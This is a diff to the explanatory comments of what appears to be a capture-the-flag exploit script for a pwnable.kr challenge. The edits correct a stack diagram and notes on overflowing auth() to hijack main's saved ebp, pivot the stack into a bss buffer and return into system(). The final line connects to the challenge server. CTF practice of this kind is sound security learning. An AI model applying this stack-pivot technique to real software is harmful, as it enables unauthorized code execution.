@@ -32,21 +32,22 @@ so overflow will overwrite ebp of main()
 Oveflow in auth():
              +-------------+
              |  main_retn  |
-    ebp -->  +-------------+
+             +-------------+
              |  callee_ebp |  <--- input_bss
-             +-------------+
+    ebp -->  +-------------+
              |             |  <--- system_addr
-ebp-0x8 -->  +-------------+
-             |     v4      |  <--- padding * 4
              +-------------+
+             |     v4      |  <--- padding * 4
+ebp-0x8 -->  +-------------+
 
 At the end of auth()
 # leave = mov esp, ebp; pop ebp     // ebp_main = input_bss
-# retn = pop eip
+# retn = pop eip                    // pop main_retn, execute main_retn
 
 At the end of main():
-# leave = mov esp, ebp; pop ebp     // esp_main = ebp_main = input_bss; input_bss = system_addr; padding*4; then execute the esp
-# retn = pop eip
+# leave = mov esp, ebp; pop ebp     // esp_main = ebp_main = input_bss; input_bss = system_addr + padding*4
+# retn = pop eip                    // esp now points to input_bss, which means that at present the eip is the value of the addr that esp points to (not the original eip).
+                                    // pop value in input_bss (value is system_addr), execute system()
 '''
 
 p = remote('pwnable.kr', 9003)
